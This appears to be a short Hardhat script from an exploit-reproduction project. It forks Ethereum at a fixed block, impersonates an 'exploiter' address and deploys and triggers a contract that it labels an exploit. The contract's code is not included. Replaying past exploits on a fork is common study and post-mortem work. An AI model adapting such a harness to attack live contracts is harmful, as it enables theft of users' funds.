const [addresses, forkFrom, impersonate] = require('../utils/utils.js');

async function main() {
    forkFrom(11242500);
    
    impersonate(addresses.exploiter);
    const attacker = ethers.provider.getSigner(addresses.exploiter);
   
    // We get the contract to deploy
    const Fiddy = await ethers.getContractFactory("Fiddy");
    //const val = ethers.utils.parseEther(1).toString();
    const fiddy = await Fiddy.deploy();
    console.log("Exploit deployed to:", fiddy.address);
  
    attacker.sendTransaction({
        to: fiddy.address,
        value: 10
    });
    
    await fiddy.test({gasLimit: 22000000, gasPrice: 99});

  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });